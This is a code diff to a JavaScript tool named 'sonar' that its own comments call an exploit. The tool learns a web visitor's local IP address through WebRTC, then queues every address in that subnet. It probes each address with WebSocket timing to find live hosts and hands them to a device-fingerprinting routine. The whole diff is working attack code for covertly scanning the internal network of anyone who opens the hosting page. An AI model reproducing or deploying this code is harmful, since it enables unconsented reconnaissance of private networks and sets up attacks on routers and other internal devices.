@@ -2,22 +2,43 @@ var sonar = {
     'debug': false,
     'fingerprints': [],
     'scans': {},
+    'websocket_timeout': 3000,
+    'ip_queue': [], // Queue of IPs to scan
 
     /*
      * Start the exploit
      */
-    'start': function(debug) {
+    'start': function(debug, interval_scan) {
         if( debug !== undefined ) {
           sonar.debug = true;
+        }
+
+        if( interval_scan === undefined ) {
+            interval_scan = 1000;
         }
 
         if( sonar.fingerprints.length == 0 ) {
             return false;
         }
 
-        sonar.scan_for_ips( function( ip ) {
-            sonar.identify_device( ip );
-        });
+        // This calls sonar.process_queue() every 
+        setInterval( function() {
+            sonar.process_queue();
+        }, interval_scan );
+
+        sonar.enumerate_local_ips();
+    },
+
+    /*
+     * Continually check if there are more IPs to be scanned and empty the queue as it fills
+     */
+    'process_queue': function() {
+        for(  i = 0; i < 5; i++ ) {
+            if( sonar.ip_queue.length > 0 ) {
+                var tmp_ip = sonar.ip_queue.shift();
+                sonar.check_ip( tmp_ip );
+            }
+        }
     },
 
     /*
@@ -82,69 +103,71 @@ var sonar = {
         sonar.fingerprints = fingerprints;
     },
 
-    /*
-     * WebRTC Scanner Code
-     * Some of the below code is taken from https://dl.dropboxusercontent.com/u/1878671/enumhosts.html
-     * All credit given to them for a nice way to enumerate internal hosts :)
-     * See also: https://hacking.ventures/local-ip-discovery-with-html5-webrtc-security-and-privacy-risk/
-     */
-    'scan_for_ips': function( callback ) {
-        var q = new TaskController(1);
-        sonar.enumerate_local_ips( function( localIp ) {
-            q.queue( function( cb ) {
-                sonar.probe_network( localIp,
-                     function( ip ) {
-                         callback( ip );
-                     },
-                 cb);
-            });
-        });
-    },
+    'ip_to_range': function( ip ) {
+        var ip_parts = ip.split( '.' );
+        if( ip_parts.length !== 4 ) {
+            return false;
+        }
 
-    'probe_ip': function(ip, timeout, cb) {
-        var start = Date.now();
-        var done = false;
-        var img = document.createElement('img');
-        var clean = function() {
-            if (!img) return;
-            document.body.removeChild(img);
-            img = null;
-        };
-        var onResult = function(success) {
-            if (done) return;
-            done = true;
-            clean();
-            cb(ip, Date.now() - start < timeout);
-        };
-        document.body.appendChild(img);
-        img.style.display = 'none';
-        img.onload = function() { 
-            onResult(true);
-        };
-        img.onerror = function() { 
-            onResult(false);
-        };
-        img.src = 'https://' + ip + ':' + ~~(1024+1024*Math.random()) + '/' + sonar.generate_random_id() + '?' + Math.random();
-        setTimeout(function() { if (img) img.src = ''; }, timeout + 500);
-    },
-
-    'probe_network': function(net, onHostFound, onDone) {
-        net = net.replace(/(\d+\.\d+\.\d+)\.\d+/, '$1.');
-        var timeout = 5000;
-        var done = false;
-        var found = [];
-        var q = new TaskController(6, onDone);
-        for (var i = 1; i < 256; ++i) {
-            q.queue((function(i, cb) {
-                sonar.probe_ip(net + i, timeout, function(ip, success) {
-                    if (success) onHostFound(ip);
-                    cb();
-                });
-            }).bind(this, i));
+        for( var i = 1; i < 255; i++ ) {
+            var tmp_ip = ip_parts[0] + '.' + ip_parts[1] + '.' + ip_parts[2] + '.' + i;
+            sonar.ip_queue.push( tmp_ip );
         }
     },
 
-    'enumerate_local_ips': function(cb) {
+    /*
+    *   Credit to lan-scan code found here: http://algorithm.dk/lanscan, WebSockets prove to be a fast way to enumerate live hosts!
+    */
+    'check_ip': function ( ip ){
+        var done = false;
+        var t1 = +new Date();
+        var socket = new WebSocket("ws://" + ip);
+        socket.onerror = function(e){
+            if(e.timeStamp - t1 < 10){
+                done = true;
+                socket.close();
+                setTimeout(function(){
+                    sonar.check_ip( ip );
+                }, sonar.websocket_timeout);
+            }
+            if(!done){
+                done = true;
+                socket.close();
+                socket = null;
+                sonar.identify_device(ip);
+            }
+        };
+        socket.onclose = function(){
+            if(!done){
+                done = true;
+                socket.close();
+                socket = null;
+                sonar.dead_ip(ip);
+            }
+        }
+        socket.onopen = function(){
+            if(!done){
+                done = true;
+                socket.close();
+                socket = null;
+                sonar.identify_device( ip );
+            }
+        }
+        setTimeout(function(){
+            if(!done){
+                done = true;
+                socket.close();
+                socket = null;
+                sonar.dead_ip( ip );
+            }
+        }, sonar.websocket_timeout);
+    },
+
+    'dead_ip': function( ip ) {
+        //console.log( 'Dead IP', ip );
+    },
+
+    'enumerate_local_ips': function() {
         var RTCPeerConnection = window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
         if (!RTCPeerConnection) return false;
         var addrs = Object.create(null);
@@ -152,7 +175,7 @@ var sonar = {
         function addAddress(newAddr) {
             if (newAddr in addrs) return;
             addrs[newAddr] = true;
-            cb(newAddr);
+            sonar.ip_to_range(newAddr);
         }
         function grepSDP(sdp) {
             var hosts = [];
@@ -228,22 +251,6 @@ var sonar = {
 }
 
 // Monkey patching JavaScript
-function TaskController(numConcurrent, onDone) {
-    this.numConcurrent = numConcurrent;
-    this.onDone = onDone || function() {};
-    this.pending = 0;
-    this.queued = [];
-    this.checkTimer = -1;
-}
-
-TaskController.prototype.deferCheck = function() {
-    if (this.checkTimer != -1) return;
-    this.checkTimer = setTimeout((function() {
-        this.checkTimer = -1;
-        this.check();
-    }).bind(this), 0);
-};
-
 Element.prototype.remove = function() {
     this.parentElement.removeChild(this);
 }
@@ -258,57 +265,4 @@ NodeList.prototype.remove = HTMLCollection.prototype.remove = function() {
 
 Element.prototype.remove = function() {
     this.parentElement.removeChild(this);
-}
-
-TaskController.prototype.check = function() {
-    if (this.pending < 1 && this.queued.length == 0) return this.onDone();
-    while (this.pending < this.numConcurrent && this.queued.length > 0) {
-        try {
-            this.pending += 1;
-            setTimeout((function(task) {
-                task((function() {
-                    this.pending -= 1;
-                    this.deferCheck();
-                }).bind(this));
-            }).bind(this, this.queued.shift()), 0);
-        }
-        catch (e) {
-            this.pending -= 1;
-            this.deferCheck();
-        }
-    }
-};
-
-TaskController.prototype.queue = function(task) {
-    this.queued.push(task);
-    this.deferCheck();
-};
-
-Array.prototype.contains = function(obj) {
-    var i = this.length;
-    while (i--) {
-        if (this[i] === obj) {
-            return true;
-        }
-    }
-    return false;
-}
-
-Array.prototype.equals = function (array) {
-    if (!array)
-        return false;
-
-    if (this.length != array.length)
-        return false;
-
-    for (var i = 0, l=this.length; i < l; i++) {
-        if (this[i] instanceof Array && array[i] instanceof Array) {
-            if (!this[i].equals(array[i]))
-                return false;
-        }
-        else if (this[i] != array[i]) {
-            return false;
-        }
-    }
-    return true;
 }
